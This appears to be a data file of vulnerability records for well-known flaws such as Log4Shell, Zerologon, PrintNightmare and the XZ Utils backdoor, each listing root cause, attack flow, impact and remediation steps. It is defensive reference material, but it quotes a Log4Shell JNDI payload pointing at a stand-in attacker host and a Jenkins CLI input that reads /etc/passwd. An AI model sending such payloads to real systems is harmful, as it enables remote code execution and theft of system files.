name: Log4Shell
description: Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.
root_cause: Improper input validation in Log4j's message lookup mechanism allowing string interpolation of JNDI references.
attack_flow: Attacker sends a specially crafted string containing '${jndi:ldap://attacker.com/a}'
Log4j processes the string and initiates a JNDI lookup to the attacker's server
The attacker's server returns a malicious Java class
Target server downloads and executes the class, leading to full RCE
impact: Full system compromise, unauthorized data access, and lateral movement.

fix.configuration: Set system property log4j2.formatMsgNoLookups to true.
steps: Identify all instances of vulnerable Log4j libraries
Upgrade to version 2.17.1 (Java 8) or 2.12.4 (Java 7)
Remove the JndiLookup class from the classpath if patching is delayed

name: Apache Struts RCE
description: The Jakarta Multipart parser in Apache Struts 2 allows remote attackers to execute arbitrary commands via a crafted Content-Type header.
root_cause: Improper handling of error messages during multipart file upload allows OGNL expression injection.
attack_flow: Attacker sends an HTTP request with a malicious Content-Type header
Header contains a crafted OGNL expression
Struts fails to parse the header and outputs an error message containing the expression
The OGNL expression is executed by the server during error processing
impact: Complete control over the web server and data theft.

fix.configuration: Switch to a different multipart parser implementation.
steps: Scan for vulnerable Apache Struts versions
Upgrade Struts framework to a patched version
Verify Content-Type validation layers

name: Heartbleed
description: A missing bounds check in the OpenSSL Heartbeat extension allows remote attackers to read server memory.
root_cause: The server trusts the user-supplied length of the heartbeat payload without verification.
attack_flow: Attacker sends a TLS Heartbeat request with a small payload but a large length field
The OpenSSL server allocates a buffer based on the requested length
The server copies out the heartbeat payload plus adjacent memory to fill the buffer
Private keys, passwords, and session tokens are leaked in the response
impact: Leaking of sensitive cryptographic keys and user credentials.

fix.configuration: Recompile OpenSSL with -DOPENSSL_NO_HEARTBEATS.
steps: Patch OpenSSL to version 1.0.1g
Revoke and reissue SSL certificates
Force password resets for all users

name: Zerologon
description: An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller.
root_cause: Flaw in the AES-CFB8 cryptographic algorithm implementation where the initialization vector is fixed to zeros.
attack_flow: Attacker sends Netlogon requests with a spoofed computer name
Attacker sends a stream of zeros in the client challenge
Due to the cryptographic flaw, the server accepts the challenge 1 in 256 times
Attacker gains Domain Admin privileges and can change the DC password
impact: Total takeover of the Windows domain infrastructure.

fix.configuration: Enable 'Enforcement mode' for Netlogon.
steps: Apply the Microsoft security update to all Domain Controllers
Monitor event logs for vulnerable Netlogon connections
Transition to Enforcement mode on all DCs

name: BlueKeep
description: A remote code execution vulnerability exists in Remote Desktop Services on Windows 7, Server 2008, and Server 2008 R2.
root_cause: Use-after-free vulnerability in the RDP kernel-mode driver when processing virtual channels.
attack_flow: Attacker connects to a target via RDP (Port 3389)
Attacker sends a specially crafted sequence of RDP packets
Packets trigger a use-after-free condition in termdd.sys
Attacker achieves kernel-level code execution without authentication
impact: Wormable remote code execution, full system takeover.

fix.patch: Apply Microsoft Windows KB4499175 or higher.
fix.configuration: Disable RDP if not needed or enable NLA (Network Level Authentication).
steps: Install the latest Windows security updates
Enable Network Level Authentication (NLA) for RDP
Block port 3389 at the enterprise firewall

name: Spring4Shell
description: A Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to remote code execution via data binding.
root_cause: Improper access to class properties via the cachedIntrospectionResults allowing manipulation of the ClassLoader.
attack_flow: Attacker sends a POST request with parameters that manipulate the 'class.module.classLoader' property
Attacker reconfigures the Tomcat Logging properties to write a JSP shell to the web root
Server creates a malicious .jsp file based on the attacker's input
Attacker accesses the JSP file to execute arbitrary commands
impact: Remote code execution on the application server.

fix.configuration: Downgrade to Java 8 or apply a WAF rule to block 'class.*' parameters.
steps: Verify Spring framework versions in Maven/Gradle
Upgrade Spring Framework to version 5.3.18+
Patch Apache Tomcat if applicable

name: Drupalgeddon2
description: A remote code execution vulnerability exists in multiple subsystems of Drupal 7 and 8.
root_cause: Improper sanitization of array keys in the Drupal Form API allowing execution of renderable arrays.
attack_flow: Attacker finds an unauthenticated form (e.g., user registration)
Attacker submits a request with '#' prefixes in parameter names
The '#' prefix triggers call_user_func in the rendering pipeline
Attacker executes arbitrary PHP code
impact: Full website defacement, data theft, and server compromise.

fix.configuration: Not applicable
steps: Immediately upgrade Drupal core to the latest security release
Check for indicators of compromise (web shells)
Audit site file permissions

name: PrintNightmare
description: A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations.
root_cause: Flaw in the RpcAddPrinterDriverEx function allowing arbitrary driver loading from a remote share.
attack_flow: Attacker authenticates as a low-privileged user
Attacker calls RpcAddPrinterDriverEx to install a malicious dll as a driver
The Print Spooler service loads the dll with SYSTEM privileges
Attacker gains full RCE on the domain controller or server
impact: Full domain compromise or server takeover.

fix.configuration: Disable the Print Spooler service on sensitive servers (DCs).
steps: Apply Microsoft emergency patches
Disable Print Spooler via GPO where not required
Restrict printer driver installation to administrators only

name: Outlook NTLM Leak
description: A zero-click vulnerability in Microsoft Outlook allows attackers to steal NTLM hashes.
root_cause: Abuse of the PidLidReminderFileParameter property which can point to a UNC path.
attack_flow: Attacker sends a malicious calendar invite or task
Reminder is triggered automatically by Outlook (Zero-Click)
Outlook attempts to fetch the reminder sound from the attacker's UNC path
Target server sends NTLM hashes for authentication to the attacker's path
impact: Credential theft and account takeover via NTLM relay attacks.

fix.configuration: Add users to the 'Protected Users' group in AD.
steps: Install the latest Outlook security patches
Block outbound SMB (Port 445) to external IP ranges
Disable NTLM authentication where possible

name: ProxyLogon
description: Microsoft Exchange Server SSRF vulnerability that allows an unauthenticated attacker to bypass authentication and impersonate an administrator.
root_cause: Improper verification of user-controlled cookies in the Exchange Control Panel.
attack_flow: Attacker sends a specially crafted POST request to the Exchange server
Request includes a 'X-BEResource' cookie pointing to the backend static resource
Attacker bypasses frontend authentication using SSRF
Attacker interacts with the ECP to upload a web shell for full RCE
impact: Full mail theft, server takeover, and lateral network movement.

fix.patch: Apply March 2021 Cumulative Update for Exchange.
fix.configuration: Restrict access to the /owa and /ecp virtual directories.
steps: Run the Microsoft Exchange health check script
Apply cumulative security updates immediately
Hunt for indicators of compromise using the Test-ProxyLogon script

name: HTTP/2 Rapid Reset
description: The HTTP/2 protocol allows a denial of service (server resource consumption) via a stream cancellation attack.
root_cause: Improper handling of RST_STREAM frames allowing rapid generation of requests without waiting for responses.
attack_flow: Attacker opens a large number of HTTP/2 streams
Attacker immediately sends a RST_STREAM frame for each stream
The server processes the request but cancellation happens too fast for resource cleanup
Server CPU and memory are exhausted processing pending requests
impact: Service disruption and server unavailability.

fix.patch: Apply patches for web servers (Nginx, HAProxy, etc.).
fix.configuration: Limit the number of concurrent streams and RST frames per connection.
steps: Update load balancers and web servers to latest versions
Implement rate limiting for RST_STREAM frames
Monitor connection state table sizes

name: Citrix NetScaler RCE
description: An unauthenticated remote code execution vulnerability in Citrix NetScaler ADC and Gateway.
root_cause: Stack-based buffer overflow in the processing of authentication requests.
attack_flow: Attacker sends a specially crafted authentication request
Large payload overflows the stack buffer during string processing
Attacker gains control of the instruction pointer
Arbitrary code execution with root privileges on the device
impact: Full takeover of the Citrix gateway and access to internal network.

fix.patch: Upgrade Citrix NetScaler ADC/Gateway to latest firmware.
fix.configuration: Disable unused gateway features.
steps: Install critical security updates from Citrix
Check for indicators of compromise (web shells in /var/vpn/)
Rotate all credentials stored on the device

name: Ivanti Connect Secure RCE
description: A command injection vulnerability in web components of Ivanti Connect Secure.
root_cause: Insufficient sanitization of user-supplied parameters in the administrative web interface.
attack_flow: Attacker authenticates (or bypasses via CVE-2023-46805)
Attacker sends a request with shell metacharacters in parameters
The server executes the injection via a system() call
Attacker gains persistent access as a root user
impact: Full compromise of VPN infrastructure and eavesdropping on sessions.

fix.patch: Apply the latest Ivanti security patches.
fix.configuration: Import the XML mititgation file provided by Ivanti.
steps: Apply Ivanti vendor security updates
Run the Integrity Checker Tool provided by vendor
Monitor for unauthorized administrative logins

name: XZ Utils Backdoor
description: A malicious backdoor was introduced into XZ Utils versions 5.6.0 and 5.6.1.
root_cause: Sophisticated multi-year social engineering campaign targeting the project maintainer.
attack_flow: Malicious code is hidden in binary test files during build time
The backdoor hijacks the RSA_public_decrypt function in sshd
Attacker sends a specific public key that triggers code execution
Unauthorized RCE/Authentication bypass on SSH servers
impact: Complete compromise of Linux distributions using the affected versions.

fix.configuration: Not applicable
steps: Audit systems for XZ Utils version 5.6.0/5.6.1
Force downgrade to a known good version (e.g. 5.4.6)
Check for binary mutations in the sshd process

name: Jenkins CLI File Read
description: The Jenkins CLI command parser allows unauthenticated users to read arbitrary files from the server.
root_cause: The 'args4j' library used by Jenkins expands '@' followed by a file path into the file content.
attack_flow: Attacker uses the Jenkins CLI with a payload like 'connect-node @/etc/passwd'
Jenkins expands the filename into its content during argument parsing
The file content is leaked in an error message or console output
Sensitive credentials or configuration details are exposed
impact: Theft of SSH keys, admin credentials, and confidential configs.

fix.configuration: Disable the CLI feature if not required.
steps: Update Jenkins controller to the latest version
Disable access to the CLI via Global Security settings
Verify no sensitive files were accessed via logs

name: Apache Struts File Upload RCE
description: An attacker can manipulate file upload parameters to enable path traversal and achieve RCE.
root_cause: Improper validation of parameter case and path traversal characters in file upload logic.
attack_flow: Attacker sends a multipart/form-data request
Parameter name is manipulated using case variation (e.g., 'Upload')
Attacker uses ../ sequences in the filename
Malicious file is written to an executable directory (e.g., webapps)
impact: Remote code execution on the application server.

fix.configuration: Not applicable
steps: Upgrade the Struts2 library in project dependencies
Restrict write permissions for the application user
Use a WAF to filter traversal patterns in filenames

name: Apache ActiveMQ RCE
description: An attacker with network access to the OpenWire port can execute arbitrary commands.
root_cause: Insecure deserialization of OpenWire commands during transportation.
attack_flow: Attacker connects to the ActiveMQ broker (Port 61616)
Attacker sends a malicious OpenWire command containing a class name
The broker instantiates the class using reflection
Arbitrary code is executed during instantiation
impact: Complete compromise of the message broker and hosted messages.

fix.configuration: Block the OpenWire port from public access.
steps: Update ActiveMQ distribution to a patched version
Enable authentication for all transport connectors
Audit broker for unauthorized web shells

name: NSO Pegasus Blastpass
description: A buffer overflow in the ImageIO framework allows unauthenticated RCE via a malicious image.
root_cause: Integer overflow in the parsing of maliciously crafted images.
attack_flow: Attacker sends a malicious PassKit (.pkpass) attachment via iMessage
The device automatically processes the image attachment
Vulnerability triggers during ImageIO parsing
Zero-click installation of Pegasus spyware
impact: Silent surveillance and data theft from mobile devices.

fix.configuration: Enable Lockdown Mode on high-risk devices.
steps: Install latest iOS and iPadOS updates
Enable Lockdown Mode for sensitive users
Monitor for suspicious outgoing network traffic

name: WebP Heap Buffer Overflow
description: A heap buffer overflow in the libwebp library when processing lossless images.
root_cause: Memory corruption during Huffman table construction for WebP images.
attack_flow: Attacker creates a maliciously crafted WebP image
User opens the image in a browser or viewer using libwebp
Vulnerability triggers a heap overflow during decompression
Attacker achieves code execution within the application context
impact: Remote code execution in browsers, image viewers, and backend services.

fix.configuration: Not applicable
steps: Update all browsers (Chrome, Firefox, Safari)
Rebuild applications using affected libwebp versions
Patch OS-level image processing libraries

name: runc Container Escape
description: An attacker can escape container isolation and gain host-level access.
root_cause: Leaky file descriptor in runc allows access to the host file system during process startup.
attack_flow: Attacker runs a malicious image or uses a specific working directory
runc inadvertently leaks an internal file descriptor (e.g. /proc/self/cwd)
Attacker uses the fd to access the host's /proc filesystem
Attacker gains full access to the host filesystem
impact: Full compromise of the container host and all other containers.

fix.configuration: Avoid running untrusted images as root.
steps: Update Docker/Kubernetes runtime to use runc 1.1.12+
User user namespaces to mitigate impact of escapes
Scan container images for malicious 'WORKDIR' instructions
